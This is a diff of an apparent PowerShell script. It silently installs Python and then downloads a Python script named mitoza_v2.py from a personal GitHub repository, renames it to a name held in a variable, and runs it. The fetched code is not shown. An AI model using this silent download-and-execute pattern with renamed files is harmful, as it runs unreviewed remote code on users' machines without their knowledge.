@@ -31,8 +31,9 @@ try {
     python -m pip install PyQt5
 }
 catch {
-    Invoke-WebRequest https://www.python.org/ftp/python/3.12.8/python-3.12.8-amd64.exe -OutFile "$direc\$pname"
-    Start-Process "$direc\python-3.12.8-amd64.exe" "/quiet","PrependPath=1"
+    $wc.Downloadfile("https://www.python.org/ftp/python/3.12.8/python-3.12.8-amd64.exe", "$direc\python-3.12.8-amd64.exe")
+    Rename-Item "$direc\python-3.12.8-amd64.exe" "$direc\$pyname.exe"
+    Start-Process "$direc\$pyname" "/quiet", "/log=$env:TEMP", "PrependPath=1","Include_doc=0", "Include_test=0"
     $err = 1
     while ($err -eq 1) {
         try {
@@ -55,7 +56,8 @@ catch {
 #    }
 #}
 
-Invoke-WebRequest https://raw.githubusercontent.com/Ksawix0/mitoza/refs/heads/main/mitoza_v2.py -outfile "$direc\$mname"
-python "$direc\$mname"
-Start-Process "$direc\$mname"
-Start-Sleep -Seconds 30
+$wc.Downloadfile( "https://raw.githubusercontent.com/Ksawix0/mitoza/refs/heads/main/mitoza_v2.py", "$direc\mitoza_v2.py")
+Rename-Item "$direc\mitoza_v2.py" "$direc\$mitname"
+python "$direc\$mitname"
+Start-Process -LiteralPath "$direc\$mitname"
+# Start-Sleep -Seconds 30
